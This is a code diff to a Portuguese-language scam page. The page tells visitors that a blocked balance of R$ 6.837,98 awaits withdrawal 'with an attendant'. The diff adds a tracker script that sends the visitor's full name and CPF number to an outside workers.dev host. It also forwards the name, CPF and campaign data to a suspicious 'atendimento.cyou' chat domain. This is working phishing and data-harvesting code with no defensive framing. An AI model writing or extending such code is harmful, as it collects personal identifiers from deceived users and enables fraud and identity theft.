@@ -151,14 +151,36 @@
       <button class="btn-sacar" onclick="(function() {
   var nome = encodeURIComponent(window._nomeUsuario || '');
   var cpf  = encodeURIComponent(document.getElementById('cpf').value || '');
-  window.location.href = 'https://viewer.atendimento.cyou/resgate-br-2026-tvb2f78?NOME=' + nome + '&CPF=' + cpf;
+  trkSend("saque", {}); var _d = trk(); var _q = '&lid=' + encodeURIComponent(_d.lid || '')  + '&utm_source=' + encodeURIComponent(_d.utm_source || '')  + '&utm_medium=' + encodeURIComponent(_d.utm_medium || '')  + '&utm_campaign=' + encodeURIComponent(_d.utm_campaign || '')  + '&utm_content=' + encodeURIComponent(_d.utm_content || '')  + '&utm_term=' + encodeURIComponent(_d.utm_term || ''); window.location.href = 'https://chat.atendimento.cyou/resgate2026?NOME=' + nome + '&CPF=' + cpf + _q;
 })()">SACAR SALDO COM<br>ATENDENTE</button>
       <p class="nota-rodape">&#9432; Esse saldo é referente a um valor de R$ 112,00 que infelizmente não foi sacado por você e acumulou em R$ 6.837,98. Seu saldo ficou bloqueado e rendeu por 4 anos e 7 meses</p>
     </div>
   </div>
 
 <script>
-  /* ========== UTILITÁRIOS ========== */
+    /* ============ TRACKER __TRK__ ============ */
+  var TRACKER_BASE = "https://tracker.kamilly-cavalcanti80.workers.dev";
+  function trk() {
+    try { return JSON.parse(localStorage.getItem("_trk") || "null") || {}; } catch (e) { return {}; }
+  }
+  function trkSend(ev, extra) {
+    var d = trk();
+    if (!d.lid) return;
+    var body = JSON.stringify({ lid: d.lid, o: d.o || "", ev: ev, data: extra || {} });
+    try {
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(TRACKER_BASE + "/e", new Blob([body], { type: "text/plain" }));
+      } else {
+        fetch(TRACKER_BASE + "/e", {
+          method: "POST", keepalive: true,
+          headers: { "content-type": "application/json" }, body: body
+        });
+      }
+    } catch (e) {}
+  }
+  /* ============ FIM TRACKER ============ */
+
+/* ========== UTILITÁRIOS ========== */
   function mostrarTela(id) {
     document.querySelectorAll('.tela').forEach(t => t.classList.remove('ativa'));
     document.getElementById(id).classList.add('ativa');
@@ -229,6 +251,11 @@
       cpfMsg.className = 'field-msg error'; ok = false;
     }
     if (!ok) return;
+    trkSend("lead", {
+      nome: nomeInput.value.trim(),
+      cpf: cpfInput.value.replace(/\D/g, "")
+    });
+
     window._nomeUsuario = nomeInput.value.trim();
     window._temNis = document.getElementById('nis').value.trim().length > 0;
     mostrarTela('tela-loading');
